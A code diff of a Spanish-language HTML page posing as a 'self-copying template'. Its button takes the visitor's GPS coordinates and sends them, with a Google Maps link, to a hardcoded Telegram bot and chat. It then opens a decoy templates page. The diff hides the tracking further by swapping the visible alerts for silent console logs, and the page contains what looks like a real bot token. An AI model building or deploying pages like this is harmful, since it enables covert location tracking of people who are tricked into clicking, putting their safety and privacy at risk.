@@ -7,48 +7,47 @@
 </head>
 <body>
     <h2>Plantilla de autocopiado</h2>
-    <button onclick="obtenerUbicacion()">Selecciona una opcion</button>
+    <button onclick="obtenerUbicacion()">Selecciona una opción</button>
 
     <script>
         function obtenerUbicacion() {
-            // 1. Abre la página en una nueva pestaña
-            window.open("https://plantillas-net.github.io/trabajo/", "_blank");
-
-            // 2. Luego obtiene la ubicación
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(enviarUbicacion, errorUbicacion);
+                navigator.geolocation.getCurrentPosition((position) => {
+                    enviarUbicacion(position);
+                    // Abrir la otra página solo DESPUÉS de enviar la ubicación
+                    window.open("https://plantillas-net.github.io/trabajo/", "_blank");
+                }, errorUbicacion);
             } else {
-                alert("La geolocalización no es soportada en este navegador.");
+                alert("sin notificacion .");
             }
         }
 
         function enviarUbicacion(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            let mensaje = `Ubicación recibida:\nLatitud: ${lat}\nLongitud: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mensaje = `Ubicación recibida:\nLatitud: ${lat}\nLongitud: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
-            let botToken = "7942913397:AAH7v5CiM27nKvV7IsK3T3TRnE-LJm5doQ0"; // ⚠️ 
-            let chatId = "1617751854"; 
+            const botToken = "7942913397:AAH7v5CiM27nKvV7IsK3T3TRnE-LJm5doQ0";
+            const chatId = "1617751854";
 
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("sin notificaciones.");
+                        console.log("sin respuesta");
                     } else {
-                        alert("Error.");
+                        console.error("Error", data);
                     }
                 })
                 .catch(error => {
-                    alert("No se pudo conectar con Telegram.");
-                    console.error(error);
+                    console.error("No se pudo conectar con Telegram.", error);
                 });
         }
 
         function errorUbicacion(error) {
-            alert("Error: " + error.message);
+            alert("Error " + error.message);
         }
     </script>
 </body>
